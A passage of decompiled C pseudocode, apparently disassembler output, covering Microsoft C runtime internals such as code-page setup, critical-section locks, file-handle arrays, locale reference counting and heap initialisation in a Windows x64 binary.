    byte_14001D928 = 1;
  }
  return 1;
}


// ===== __acrt_update_thread_multibyte_data @ 0x14000a6ec size=0xbf =====
void *_acrt_update_thread_multibyte_data()
{
  struct __acrt_ptd *v0; // rax
  struct __acrt_ptd *v1; // rdi
  void *v2; // rbx
  void *Block; // [rsp+30h] [rbp+8h]

  v0 = _acrt_getptd();
  v1 = v0;
  if ( (dword_14001C8C0 & *((_DWORD *)v0 + 234)) != 0 && *((_QWORD *)v0 + 18) != 0 )
  {
    v2 = *((void **)v0 + 17);
  }
  else
  {
    sub_14000AB5C(5);
    v2 = *((void **)v1 + 17);
    if ( v2 != off_14001C4F8 )
    {
      if ( v2 != nullptr
        && _InterlockedExchangeAdd((volatile signed __int32 *)v2, 0xFFFFFFFF) == 1
        && v2 != &unk_14001C2D0 )
      {
        free_base(v2);
      }
      *((_QWORD *)v1 + 17) = off_14001C4F8;
      Block = off_14001C4F8;
      _InterlockedIncrement((volatile signed __int32 *)off_14001C4F8);
      v2 = Block;
    }
    sub_14000ABB0(5);
  }
  if ( v2 == nullptr )
    abort();
  return v2;
}


// ===== _setmbcp_nolock @ 0x14000a7ac size=0x2a7 =====
__int64 __fastcall setmbcp_nolock(UINT a1, __int64 a2)
{
  const wchar_t *v3; // rsi
  UINT SystemCP; // edi
  unsigned int v5; // ebp
  _DWORD *v6; // rax
  BYTE *i; // rcx
  unsigned int v8; // eax
  unsigned int v9; // edx
  __int64 v10; // rdi
  __int64 v11; // rdx
  _BYTE *v12; // rax
  __int64 j; // rcx
  const wchar_t *v14; // rax
  _WORD *v15; // rdi
  __int64 k; // rcx
  __int64 v18; // rax
  _BYTE *v19; // r14
  __int64 v20; // rbp
  char *v21; // r9
  unsigned __int8 *v22; // rdx
  unsigned int v23; // r8d
  __int64 v24; // r10
  UINT v25; // edi
  UINT v26; // edi
  UINT v27; // edi
  _WORD *v28; // rcx
  __int64 m; // rdx
  struct _cpinfo CPInfo; // [rsp+20h] [rbp-48h] BYREF

  v3 = nullptr;
  SystemCP = getSystemCP(a1);
  if ( SystemCP != 0 )
  {
    v5 = 0;
    v6 = &unk_14001C510;
    while ( *v6 != SystemCP )
    {
      ++v5;
      v6 += 12;
      if ( v5 >= 5 )
      {
        if ( SystemCP - 65000 > 1 && IsValidCodePage((unsigned __int16)SystemCP) )
        {
          if ( GetCPInfo(SystemCP, &CPInfo) )
          {
            sub_140002F60((__m128i *)(a2 + 24), 0, 0x101u);
            *(_DWORD *)(a2 + 4) = SystemCP;
            *(_QWORD *)(a2 + 544) = 0;
            if ( CPInfo.MaxCharSize <= 1 )
            {
              *(_DWORD *)(a2 + 8) = 0;
            }
            else
            {
              for ( i = CPInfo.LeadByte; *i != 0; i += 2 )
              {
                if ( i[1] == 0 )
                  break;
                v8 = i[1];
                v9 = *i;
                if ( v9 <= v8 )
                {
                  v10 = v9 + 1;
                  v11 = v8 - v9 + 1;
                  do
                  {
                    *(_BYTE *)(v10 + a2 + 24) |= 4u;
                    v10 = (unsigned int)(v10 + 1);
                    --v11;
                  }
                  while ( v11 != 0 );
                }
              }
              v12 = (_BYTE *)(a2 + 26);
              for ( j = 254; j != 0; --j )
                *v12++ |= 8u;
              switch ( *(_DWORD *)(a2 + 4) )
              {
                case 0x3A4:
                  v14 = L"ja-JP";
                  break;
                case 0x3A8:
                  v14 = L"zh-CN";
                  break;
                case 0x3B5:
                  v14 = L"ko-KR";
                  break;
                case 0x3B6:
                  v14 = L"zh-TW";
                  break;
                default:
                  v14 = nullptr;
                  break;
              }
              *(_QWORD *)(a2 + 544) = v14;
              *(_DWORD *)(a2 + 8) = 1;
            }
            v15 = (_WORD *)(a2 + 12);
            for ( k = 6; k != 0; --k )
              *v15++ = 0;
            goto LABEL_54;
          }
          if ( dword_14001D91C != 0 )
            goto LABEL_2;
        }
        return 0xFFFFFFFFLL;
      }
    }
    sub_140002F60((__m128i *)(a2 + 24), 0, 0x101u);
    v18 = v5;
    v19 = &unk_14001C500;
    v20 = 4;
    v21 = (char *)&unk_14001C520 + 48 * v18;
    do
    {
      v22 = (unsigned __int8 *)v21;
      if ( *v21 != 0 )
      {
        do
        {
          if ( v22[1] == 0 )
            break;
          v23 = *v22;
          if ( v23 <= v22[1] )
          {
            v24 = v23 + 1;
            do
            {
              if ( (unsigned int)v24 >= 0x101 )
                break;
              ++v23;
              *(_BYTE *)(v24 + a2 + 24) |= *v19;
              v24 = (unsigned int)(v24 + 1);
            }
            while ( v23 <= v22[1] );
          }
          v22 += 2;
        }
        while ( *v22 != 0 );
      }
      v21 += 8;
      ++v19;
      --v20;
    }
    while ( v20 != 0 );
    *(_DWORD *)(a2 + 4) = SystemCP;
    *(_DWORD *)(a2 + 8) = 1;
    v25 = SystemCP - 932;
    if ( v25 != 0 )
    {
      v26 = v25 - 4;
      if ( v26 != 0 )
      {
        v27 = v26 - 13;
        if ( v27 != 0 )
        {
          if ( v27 == 1 )
            v3 = L"zh-TW";
        }
        else
        {
          v3 = L"ko-KR";
        }
      }
      else
      {
        v3 = L"zh-CN";
      }
    }
    else
    {
      v3 = L"ja-JP";
    }
    *(_QWORD *)(a2 + 544) = v3;
    v28 = (_WORD *)(a2 + 12);
    for ( m = 6; m != 0; --m )
    {
      *v28 = *(_WORD *)((char *)v28 + (_QWORD)&unk_14001C510 + 48 * v18 - a2 - 8);
      ++v28;
    }
LABEL_54:
    setSBUpLow((struct __crt_multibyte_data *)a2);
  }
  else
  {
LABEL_2:
    setSBCS((struct __crt_multibyte_data *)a2);
  }
  return 0;
}


// ===== __acrt_initialize_command_line @ 0x14000aa54 size=0x25 =====
char _acrt_initialize_command_line()
{
  qword_14001D940 = (__int64)GetCommandLineA();
  qword_14001D948 = (__int64)GetCommandLineW();
  return 1;
}


// ===== __dcrt_get_wide_environment_from_os @ 0x14000aa7c size=0x97 =====
__m128i *_dcrt_get_wide_environment_from_os()
{
  LPWCH EnvironmentStringsW; // rax
  __m128i *v1; // rsi
  __m128i *v2; // rbx
  __int64 v3; // rcx
  size_t v4; // rbp
  __m128i *v5; // rax
  __m128i *v6; // rdi

  EnvironmentStringsW = GetEnvironmentStringsW();
  v1 = nullptr;
  v2 = (__m128i *)EnvironmentStringsW;
  if ( EnvironmentStringsW != nullptr )
  {
    while ( *EnvironmentStringsW != 0 )
    {
      v3 = -1;
      do
        ++v3;
      while ( EnvironmentStringsW[v3] != 0 );
      EnvironmentStringsW += v3 + 1;
    }
    v4 = 2 * (((char *)EnvironmentStringsW - (char *)v2 + 2) >> 1);
    v5 = (__m128i *)malloc_base(v4);
    v6 = v5;
    if ( v5 != nullptr )
    {
      sub_1400036D0(v5, v2, v4);
      v1 = v6;
    }
    free_base(nullptr);
    FreeEnvironmentStringsW((LPWCH)v2);
  }
  return v1;
}


// ===== __vcrt_initialize_locks_0 @ 0x14000ab14 size=0x48 =====
char _vcrt_initialize_locks_0()
{
  __int64 v0; // rbx

  v0 = 0;
  while ( _acrt_InitializeCriticalSectionEx((LPCRITICAL_SECTION)&unk_14001D960 + v0, 0xFA0u, 0) != 0 )
  {
    ++dword_14001DB68;
    v0 = (unsigned int)(v0 + 1);
    if ( (unsigned int)v0 >= 0xD )
      return 1;
  }
  _vcrt_uninitialize_locks_0(0);
  return 0;
}


// ===== sub_14000AB5C @ 0x14000ab5c size=0x19 =====
void __fastcall sub_14000AB5C(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)&unk_14001D960 + a1);
}


// ===== __vcrt_uninitialize_locks_0 @ 0x14000ab78 size=0x37 =====
char _vcrt_uninitialize_locks_0()
{
  int v0; // ebx

  v0 = dword_14001DB68;
  while ( v0 != 0 )
  {
    DeleteCriticalSection((LPCRITICAL_SECTION)&unk_14001D960 + (unsigned int)--v0);
    --dword_14001DB68;
  }
  return 1;
}


// ===== sub_14000ABB0 @ 0x14000abb0 size=0x19 =====
void __fastcall sub_14000ABB0(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)&unk_14001D960 + a1);
}


// ===== __acrt_lowio_create_handle_array @ 0x14000abcc size=0x95 =====
char *_acrt_lowio_create_handle_array()
{
  char *v0; // rax
  char *v1; // rsi
  char *v2; // rbx
  char *v3; // rbp
  char *v4; // rdi

  v0 = (char *)calloc_base(0x40u, 0x40u);
  v1 = nullptr;
  v2 = v0;
  if ( v0 != nullptr )
  {
    v3 = v0 + 4096;
    v4 = v0 + 48;
    do
    {
      _acrt_InitializeCriticalSectionEx((LPCRITICAL_SECTION)(v4 - 48), 0xFA0u, 0);
      *((_QWORD *)v4 - 1) = -1;
      *(_QWORD *)v4 = 0;
      *((_DWORD *)v4 + 2) = 168427520;
      v4[12] = 10;
      v4[13] &= 0xF8u;
      v4[14] = 0;
      v4 += 64;
    }
    while ( v4 - 48 != v3 );
    v1 = v2;
  }
  free_base(nullptr);
  return v1;
}


// ===== __acrt_lowio_destroy_handle_array @ 0x14000ac64 size=0x50 =====
void __fastcall _acrt_lowio_destroy_handle_array(char *Block)
{
  struct _RTL_CRITICAL_SECTION *v1; // rsi
  struct _RTL_CRITICAL_SECTION *v3; // rdi

  if ( Block != nullptr )
  {
    v1 = (struct _RTL_CRITICAL_SECTION *)(Block + 4096);
    v3 = (struct _RTL_CRITICAL_SECTION *)Block;
    do
    {
      DeleteCriticalSection(v3);
      v3 = (struct _RTL_CRITICAL_SECTION *)((char *)v3 + 64);
    }
    while ( v3 != v1 );
    free_base(Block);
  }
}


// ===== __acrt_lowio_ensure_fh_exists @ 0x14000acb4 size=0xb7 =====
__int64 __fastcall _acrt_lowio_ensure_fh_exists(unsigned int a1)
{
  unsigned int v2; // ebx
  __int64 v4; // rdi
  int v5; // eax
  char *handle_array; // rax

  v2 = 0;
  if ( a1 < 0x2000 )
  {
    sub_14000AB5C(7);
    v4 = 0;
    v5 = dword_14001D750;
    while ( (int)a1 >= v5 )
    {
      if ( qword_14001D350[v4] == 0 )
      {
        handle_array = _acrt_lowio_create_handle_array();
        qword_14001D350[v4] = (__int64)handle_array;
        if ( handle_array == nullptr )
        {
          v2 = 12;
          break;
        }
        v5 = dword_14001D750 + 64;
        dword_14001D750 += 64;
      }
      ++v4;
    }
    sub_14000ABB0(7);
  }
  else
  {
    v2 = 9;
    *errno() = 9;
    invalid_parameter_noinfo();
  }
  return v2;
}


// ===== sub_14000AD6C @ 0x14000ad6c size=0x23 =====
void __fastcall sub_14000AD6C(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(qword_14001D350[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6)));
}


// ===== sub_14000AD90 @ 0x14000ad90 size=0x23 =====
void __fastcall sub_14000AD90(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(qword_14001D350[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6)));
}


// ===== _free_osfhnd @ 0x14000adb4 size=0xba =====
__int64 __fastcall free_osfhnd(int a1)
{
  __int64 v2; // rsi
  unsigned __int64 v3; // rdi
  __int64 v4; // rax
  int v5; // ebx
  DWORD v6; // ecx

  if ( a1 >= 0 && a1 < (unsigned int)dword_14001D750 )
  {
    v2 = (__int64)a1 >> 6;
    v3 = (unsigned __int64)(a1 & 0x3F) << 6;
    v4 = qword_14001D350[v2];
    if ( (*(_BYTE *)(v4 + v3 + 56) & 1) != 0 && *(_QWORD *)(v4 + v3 + 40) != -1 )
    {
      if ( (unsigned int)sub_140005740() == 1 )
      {
        if ( a1 == 0 )
        {
          v6 = -10;
          goto LABEL_12;
        }
        v5 = a1 - 1;
        if ( v5 == 0 )
        {
          v6 = -11;
          goto LABEL_12;
        }
        if ( v5 == 1 )
        {
          v6 = -12;
LABEL_12:
          SetStdHandle(v6, nullptr);
        }
      }
      *(_QWORD *)(qword_14001D350[v2] + v3 + 40) = -1;
      return 0;
    }
  }
  *errno() = 9;
  *_doserrno() = 0;
  return 0xFFFFFFFFLL;
}


// ===== _get_osfhandle @ 0x14000ae70 size=0x75 =====
intptr_t __cdecl get_osfhandle(int FileHandle)
{
  unsigned __int64 v1; // rdx
  __int64 v2; // rax

  if ( FileHandle == -2 )
  {
    *_doserrno() = 0;
    *errno() = 9;
  }
  else
  {
    if ( FileHandle >= 0 && FileHandle < (unsigned int)dword_14001D750 )
    {
      v1 = (unsigned __int64)(FileHandle & 0x3F) << 6;
      v2 = qword_14001D350[(__int64)FileHandle >> 6];
      if ( (*(_BYTE *)(v2 + v1 + 56) & 1) != 0 )
        return *(_QWORD *)(v2 + v1 + 40);
    }
    *_doserrno() = 0;
    *errno() = 9;
    invalid_parameter_noinfo();
  }
  return -1;
}


// ===== __acrt_locale_free_monetary @ 0x14000aee8 size=0x10a =====
void __fastcall _acrt_locale_free_monetary(_QWORD *a1)
{
  void *v2; // rcx
  void *v3; // rcx
  void *v4; // rcx
  void *v5; // rcx
  void *v6; // rcx
  void *v7; // rcx
  void *v8; // rcx
  void *v9; // rcx
  void *v10; // rcx
  void *v11; // rcx
  void *v12; // rcx
  void *v13; // rcx
  void *v14; // rcx

  if ( a1 != nullptr )
  {
    v2 = (void *)a1[3];
    if ( v2 != off_14001C838 )
      free_base(v2);
    v3 = (void *)a1[4];
    if ( v3 != off_14001C840 )
      free_base(v3);
    v4 = (void *)a1[5];
    if ( v4 != off_14001C848 )
      free_base(v4);
    v5 = (void *)a1[6];
    if ( v5 != off_14001C850 )
      free_base(v5);
    v6 = (void *)a1[7];
    if ( v6 != off_14001C858 )
      free_base(v6);
    v7 = (void *)a1[8];
    if ( v7 != off_14001C860 )
      free_base(v7);
    v8 = (void *)a1[9];
    if ( v8 != off_14001C868 )
      free_base(v8);
    v9 = (void *)a1[13];
    if ( v9 != off_14001C888 )
      free_base(v9);
    v10 = (void *)a1[14];
    if ( v10 != off_14001C890 )
      free_base(v10);
    v11 = (void *)a1[15];
    if ( v11 != off_14001C898 )
      free_base(v11);
    v12 = (void *)a1[16];
    if ( v12 != off_14001C8A0 )
      free_base(v12);
    v13 = (void *)a1[17];
    if ( v13 != off_14001C8A8 )
      free_base(v13);
    v14 = (void *)a1[18];
    if ( v14 != off_14001C8B0 )
      free_base(v14);
  }
}


// ===== __acrt_locale_free_numeric @ 0x14000aff4 size=0x6c =====
void __fastcall _acrt_locale_free_numeric(__int64 a1)
{
  void *v2; // rcx
  void *v3; // rcx
  void *v4; // rcx
  void *v5; // rcx
  void *v6; // rcx

  if ( a1 != 0 )
  {
    v2 = *(void **)a1;
    if ( v2 != off_14001C820 )
      free_base(v2);
    v3 = *(void **)(a1 + 8);
    if ( v3 != off_14001C828 )
      free_base(v3);
    v4 = *(void **)(a1 + 16);
    if ( v4 != off_14001C830 )
      free_base(v4);
    v5 = *(void **)(a1 + 88);
    if ( v5 != off_14001C878 )
      free_base(v5);
    v6 = *(void **)(a1 + 96);
    if ( v6 != off_14001C880 )
      free_base(v6);
  }
}


// ===== ?free_crt_array_internal@@YAXQEAPEBX_K@Z @ 0x14000b060 size=0x56 =====
void __fastcall free_crt_array_internal(void **a1, __int64 a2)
{
  __int64 v2; // rdi
  void **v3; // rbx
  unsigned __int64 v4; // rsi

  v2 = 0;
  v3 = a1;
  v4 = (unsigned __int64)(8 * a2 + 7) >> 3;
  if ( a1 > &a1[a2] )
    v4 = 0;
  if ( v4 != 0 )
  {
    do
    {
      free_base(*v3);
      ++v2;
      ++v3;
    }
    while ( v2 != v4 );
  }
}


// ===== __acrt_locale_free_time @ 0x14000b0b8 size=0x108 =====
void __fastcall _acrt_locale_free_time(void **a1)
{
  if ( a1 != nullptr )
  {
    free_crt_array_internal(a1, 7);
    free_crt_array_internal(a1 + 7, 7);
    free_crt_array_internal(a1 + 14, 12);
    free_crt_array_internal(a1 + 26, 12);
    free_crt_array_internal(a1 + 38, 2);
    free_base(a1[40]);
    free_base(a1[41]);
    free_base(a1[42]);
    free_crt_array_internal(a1 + 44, 7);
    free_crt_array_internal(a1 + 51, 7);
    free_crt_array_internal(a1 + 58, 12);
    free_crt_array_internal(a1 + 70, 12);
    free_crt_array_internal(a1 + 82, 2);
    free_base(a1[84]);
    free_base(a1[85]);
    free_base(a1[86]);
    free_base(a1[87]);
  }
}


// ===== __pctype_func @ 0x14000b1c0 size=0x2f =====
const unsigned __int16 *__cdecl _pctype_func()
{
  struct __acrt_ptd *v0; // rax
  const unsigned __int16 **v2; // [rsp+30h] [rbp+8h] BYREF

  v0 = _acrt_getptd();
  v2 = *((const unsigned __int16 ***)v0 + 18);
  sub_140007FBC((__int64)v0, (__int64 *)&v2);
  return *v2;
}


// ===== wcspbrk @ 0x14000b1f0 size=0x37 =====
wchar_t *__cdecl wcspbrk(const wchar_t *String, const wchar_t *Control)
{
  const wchar_t *v3; // rax
  wchar_t v4; // dx

  while ( 1 )
  {
    if ( *String == 0 )
      return nullptr;
    v3 = Control;
    if ( *Control != 0 )
      break;
LABEL_6:
    ++String;
  }
  v4 = *Control;
  while ( v4 != *String )
  {
    v4 = *++v3;
    if ( *v3 == 0 )
      goto LABEL_6;
  }
  return (wchar_t *)String;
}


// ===== __acrt_GetStringTypeA @ 0x14000b228 size=0x1b1 =====
__int64 __fastcall _acrt_GetStringTypeA(
        struct __crt_locale_pointers *a1,
        DWORD dwInfoType,
        LPCCH lpMultiByteStr,
        int cbMultiByte,
        LPWORD lpCharType,
        UINT CodePage,
        int a7)
{
  UINT v10; // esi
  int v11; // eax
  __int64 cchWideChar; // r14
  unsigned int StringTypeW; // edi
  unsigned __int64 v14; // rdi
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // rcx
  __int64 v17; // rax
  void *v18; // rsp
  __m128i *lpWideCharStr; // rbx
  __m128i *v20; // rax
  int v21; // eax
  __int64 v23; // [rsp+0h] [rbp-30h] BYREF
  _QWORD v24[3]; // [rsp+30h] [rbp+0h] BYREF
  char v25; // [rsp+48h] [rbp+18h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v24, a1);
  v10 = CodePage;
  if ( CodePage == 0 )
    v10 = *(_DWORD *)(v24[1] + 12LL);
  v11 = MultiByteToWideChar(v10, a7 != 0 ? 9 : 1, lpMultiByteStr, cbMultiByte, nullptr, 0);
  cchWideChar = v11;
  if ( v11 == 0 )
  {
    StringTypeW = 0;
    goto LABEL_22;
  }
  v14 = 2LL * v11;
  if ( (-(__int64)(v14 < v14 + 16) & (v14 + 16)) == 0 )
  {
    lpWideCharStr = nullptr;
    goto LABEL_15;
  }
  v15 = v14 + 16;
  if ( ((v14 + 16) & -(__int64)(v14 < v14 + 16)) <= 0x400 )
  {
    v16 = v15 & -(__int64)(v14 < v15);
    v17 = v16 + 15;
    if ( v16 + 15 < v16 )
      v17 = 0xFFFFFFFFFFFFFF0LL;
    v18 = alloca(v17 & 0xFFFFFFFFFFFFFFF0uLL);
    lpWideCharStr = (__m128i *)v24;
    if ( &v23 == (__int64 *)-48LL )
      goto LABEL_18;
    LODWORD(v24[0]) = 52428;
    goto LABEL_13;
  }
  v20 = (__m128i *)malloc_base(v15 & -(__int64)(v14 < v15));
  lpWideCharStr = v20;
  if ( v20 != nullptr )
  {
    v20->m128i_i32[0] = 56797;
LABEL_13:
    ++lpWideCharStr;
  }
LABEL_15:
  if ( lpWideCharStr == nullptr
    || (sub_140002F60(lpWideCharStr, 0, 2 * cchWideChar),
        (v21 = MultiByteToWideChar(v10, 1u, lpMultiByteStr, cbMultiByte, (LPWSTR)lpWideCharStr, cchWideChar)) == 0) )
  {
LABEL_18:
    StringTypeW = 0;
    goto LABEL_19;
  }
  StringTypeW = GetStringTypeW(dwInfoType, (LPCWCH)lpWideCharStr, v21, lpCharType);
LABEL_19:
  if ( lpWideCharStr != nullptr && lpWideCharStr[-1].m128i_i32[0] == 56797 )
    free_base(&lpWideCharStr[-1]);
LABEL_22:
  if ( v25 != 0 )
    *(_DWORD *)(v24[0] + 936LL) &= ~2u;
  return StringTypeW;
}


// ===== __acrt_add_locale_ref @ 0x14000b3dc size=0x8b =====
__int64 __fastcall _acrt_add_locale_ref(__int64 a1)
{
  volatile signed __int32 *v1; // rax
  volatile signed __int32 *v2; // rax
  volatile signed __int32 *v3; // rax
  volatile signed __int32 *v4; // rax
  volatile signed __int32 **v5; // rax
  __int64 i; // r8
  volatile signed __int32 *v7; // rdx
  __int64 v8; // rcx

  _InterlockedIncrement((volatile signed __int32 *)(a1 + 16));
  v1 = *(volatile signed __int32 **)(a1 + 224);
  if ( v1 != nullptr )
    _InterlockedIncrement(v1);
  v2 = *(volatile signed __int32 **)(a1 + 240);
  if ( v2 != nullptr )
    _InterlockedIncrement(v2);
  v3 = *(volatile signed __int32 **)(a1 + 232);
  if ( v3 != nullptr )
    _InterlockedIncrement(v3);
  v4 = *(volatile signed __int32 **)(a1 + 256);
  if ( v4 != nullptr )
    _InterlockedIncrement(v4);
  v5 = (volatile signed __int32 **)(a1 + 56);
  for ( i = 6; i != 0; --i )
  {
    if ( *(v5 - 2) != (volatile signed __int32 *)&unk_14001C2C8 && *v5 != nullptr )
      _InterlockedIncrement(*v5);
    if ( *(v5 - 3) != nullptr )
    {
      v7 = *(v5 - 1);
      if ( v7 != nullptr )
        _InterlockedIncrement(v7);
    }
    v5 += 4;
  }
  v8 = *(_QWORD *)(a1 + 288);
  if ( v8 == 0 || (_UNKNOWN **)v8 == &off_140012350 )
    return 0x7FFFFFFF;
  else
    return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(v8 + 348));
}


// ===== __acrt_free_locale @ 0x14000b468 size=0x176 =====
void __fastcall _acrt_free_locale(char *Block)
{
  _UNKNOWN **v1; // rax
  _DWORD *v3; // rax
  _DWORD *v4; // rcx
  _DWORD *v5; // rcx
  _DWORD *v6; // rax
  void **v7; // rsi
  __int64 v8; // rbp
  _DWORD **v9; // rdi
  _DWORD *v10; // rcx
  _DWORD *v11; // rcx

  v1 = *((_UNKNOWN ***)Block + 31);
  if ( v1 != nullptr && v1 != &off_14001C820 )
  {
    v3 = *((_DWORD **)Block + 28);
    if ( v3 != nullptr && *v3 == 0 )
    {
      v4 = *((_DWORD **)Block + 30);
      if ( v4 != nullptr && *v4 == 0 )
      {
        free_base(v4);
        _acrt_locale_free_monetary(*((_QWORD **)Block + 31));
      }
      v5 = *((_DWORD **)Block + 29);
      if ( v5 != nullptr && *v5 == 0 )
      {
        free_base(v5);
        _acrt_locale_free_numeric(*((_QWORD *)Block + 31));
      }
      free_base(*((void **)Block + 28));
      free_base(*((void **)Block + 31));
    }
  }
  v6 = *((_DWORD **)Block + 32);
  if ( v6 != nullptr && *v6 == 0 )
  {
    free_base((void *)(*((_QWORD *)Block + 33) - 254LL));
    free_base((void *)(*((_QWORD *)Block + 34) - 128LL));
    free_base((void *)(*((_QWORD *)Block + 35) - 128LL));
    free_base(*((void **)Block + 32));
  }
  _acrt_locale_free_lc_time_if_unreferenced(*((void **)Block + 36));
  v7 = (void **)(Block + 296);
  v8 = 6;
  v9 = (_DWORD **)(Block + 56);
  do
  {
    if ( *(v9 - 2) != (_DWORD *)&unk_14001C2C8 )
    {
      v10 = *v9;
      if ( *v9 != nullptr && *v10 == 0 )
      {
        free_base(v10);
        free_base(*v7);
      }
    }
    if ( *(v9 - 3) != nullptr )
    {
      v11 = *(v9 - 1);
      if ( v11 != nullptr && *v11 == 0 )
        free_base(v11);
    }
    ++v7;
    v9 += 4;
    --v8;
  }
  while ( v8 != 0 );
  free_base(Block);
}


// ===== __acrt_locale_free_lc_time_if_unreferenced @ 0x14000b608 size=0x36 =====
void __fastcall _acrt_locale_free_lc_time_if_unreferenced(void **Block)
{
  if ( Block != nullptr && Block != (void **)&off_140012350 && *((_DWORD *)Block + 87) == 0 )
  {
    _acrt_locale_free_time(Block);
    free_base(Block);
  }
}


// ===== __acrt_locale_release_lc_time_reference @ 0x14000b640 size=0x25 =====
__int64 __fastcall _acrt_locale_release_lc_time_reference(__int64 a1)
{
  if ( a1 == 0 || (_UNKNOWN **)a1 == &off_140012350 )
    return 0x7FFFFFFF;
  else
    return (unsigned int)_InterlockedDecrement((volatile signed __int32 *)(a1 + 348));
}


// ===== __acrt_release_locale_ref @ 0x14000b668 size=0xa8 =====
void __fastcall _acrt_release_locale_ref(__int64 a1)
{
  volatile signed __int32 *v1; // rax
  volatile signed __int32 *v2; // rax
  volatile signed __int32 *v3; // rax
  volatile signed __int32 *v4; // rax
  volatile signed __int32 **v5; // rax
  __int64 i; // r8
  volatile signed __int32 *v7; // rdx

  if ( a1 != 0 )
  {
    _InterlockedAdd((volatile signed __int32 *)(a1 + 16), 0xFFFFFFFF);
    v1 = *(volatile signed __int32 **)(a1 + 224);
    if ( v1 != nullptr )
      _InterlockedAdd(v1, 0xFFFFFFFF);
    v2 = *(volatile signed __int32 **)(a1 + 240);
    if ( v2 != nullptr )
      _InterlockedAdd(v2, 0xFFFFFFFF);
    v3 = *(volatile signed __int32 **)(a1 + 232);
    if ( v3 != nullptr )
      _InterlockedAdd(v3, 0xFFFFFFFF);
    v4 = *(volatile signed __int32 **)(a1 + 256);
    if ( v4 != nullptr )
      _InterlockedAdd(v4, 0xFFFFFFFF);
    v5 = (volatile signed __int32 **)(a1 + 56);
    for ( i = 6; i != 0; --i )
    {
      if ( *(v5 - 2) != (volatile signed __int32 *)&unk_14001C2C8 && *v5 != nullptr )
        _InterlockedAdd(*v5, 0xFFFFFFFF);
      if ( *(v5 - 3) != nullptr )
      {
        v7 = *(v5 - 1);
        if ( v7 != nullptr )
          _InterlockedAdd(v7, 0xFFFFFFFF);
      }
      v5 += 4;
    }
    _acrt_locale_release_lc_time_reference(*(_QWORD *)(a1 + 288));
  }
}


// ===== __acrt_update_thread_locale_data @ 0x14000b710 size=0x70 =====
__int64 _acrt_update_thread_locale_data()
{
  struct __acrt_ptd *v0; // rax
  struct __acrt_ptd *v1; // rdi
  __int64 v2; // rbx

  v0 = _acrt_getptd();
  v1 = v0;
  if ( (dword_14001C8C0 & *((_DWORD *)v0 + 234)) == 0 || (v2 = *((_QWORD *)v0 + 18)) == 0 )
  {
    sub_14000AB5C(4);
    v2 = updatetlocinfoEx_nolock((char *)v1 + 144, qword_14001D340);
    sub_14000ABB0(4);
    if ( v2 == 0 )
      abort();
  }
  return v2;
}


// ===== _updatetlocinfoEx_nolock @ 0x14000b780 size=0x68 =====
__int64 __fastcall updatetlocinfoEx_nolock(__int64 *a1, __int64 a2)
{
  __int64 v3; // rbx

  if ( a2 == 0 || a1 == nullptr )
    return 0;
  v3 = *a1;
  if ( *a1 == a2 )
    return a2;
  *a1 = a2;
  _acrt_add_locale_ref(a2);
  if ( v3 != 0 )
  {
    _acrt_release_locale_ref(v3);
    if ( *(_DWORD *)(v3 + 16) == 0 && (wchar_t **)v3 != &off_14001C160 )
      _acrt_free_locale((char *)v3);
  }
  return a2;
}


// ===== j__recalloc_base @ 0x14000b7e8 size=0x5 =====
// attributes: thunk
void *__cdecl j__recalloc_base(void *Block, size_t Count, size_t Size)
{
  return recalloc_base(Block, Count, Size);
}


// ===== _recalloc_base @ 0x14000b7f0 size=0x95 =====
void *__cdecl recalloc_base(void *Block, size_t Count, size_t Size)
{
  size_t v7; // rdi
  size_t v8; // rbx
  char *v9; // rax
  void *v10; // rsi

  if ( Count != 0 && 0xFFFFFFFFFFFFFFE0uLL / Count < Size )
  {
    *errno() = 12;
    return nullptr;
  }
  else
  {
    if ( Block != nullptr )
      v7 = msize(Block);
    else
      v7 = 0;
    v8 = Size * Count;
    v9 = (char *)realloc_base(Block, v8);
    v10 = v9;
    if ( v9 != nullptr && v7 < v8 )
      sub_140002F60((__m128i *)&v9[v7], 0, v8 - v7);
    return v10;
  }
}


// ===== __acrt_initialize_heap @ 0x14000b888 size=0x1c =====
bool _acrt_initialize_heap()
{
  hHeap = GetProcessHeap();
  return hHeap != nullptr;
}


// ===== sub_14000B8A4 @ 0x14000b8a4 size=0xb =====
char sub_14000B8A4()
{
  hHeap = nullptr;
  return 1;
}


// ===== __acrt_execute_initializers @ 0x14000b8b0 size=0x94 =====
char __fastcall _acrt_execute_initializers(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v5; // rbx
  void (__fastcall **v6)(_QWORD); // rbx

  if ( a1 == a2 )
    return 1;
  v5 = a1;
  do
  {
    if ( *v5 != 0 && ((unsigned __int8 (__fastcall *)(_QWORD))*v5)(*v5) == 0 )
      break;
    v5 += 2;
  }
  while ( v5 != a2 );
  if ( v5 == a2 )
    return 1;
  if ( v5 != a1 )
  {
    v6 = (void (__fastcall **)(_QWORD))(v5 - 1);
    do
    {
      if ( *(v6 - 1) != nullptr && *v6 != nullptr )
        (*v6)(0);
      v6 -= 2;
    }
    while ( v6 + 1 != a1 );
  }
  return 0;
}


// ===== __acrt_execute_uninitializers @ 0x14000b944 size=0x4f =====
char __fastcall _acrt_execute_uninitializers(void (__fastcall **a1)(_QWORD), void (__fastcall **a2)(_QWORD))
{
  void (__fastcall **v3)(_QWORD); // rbx

  if ( a1 != a2 )
  {
    v3 = a2 - 1;
    do
    {
      if ( *v3 != nullptr )
        (*v3)(0);
      v3 -= 2;
    }
    while ( v3 + 1 != a1 );
  }
  return 1;
}


// ===== sub_14000B994 @ 0x14000b994 size=0x8 =====
void __fastcall sub_14000B994(__int64 a1)
{
  qword_14001DB80 = a1;
}


// ===== _callnewh @ 0x14000b99c size=0x40 =====
int __cdecl callnewh(size_t Size)
{
  _PNH new_handler; // rax

  new_handler = query_new_handler();
  return new_handler != nullptr && ((unsigned int (__fastcall *)(size_t))new_handler)(Size) != 0;
}


// ===== _query_new_handler @ 0x14000b9dc size=0x34 =====
_PNH __cdecl query_new_handler()
{
  int (__cdecl *v0)(size_t); // rbx

  sub_14000AB5C(0);
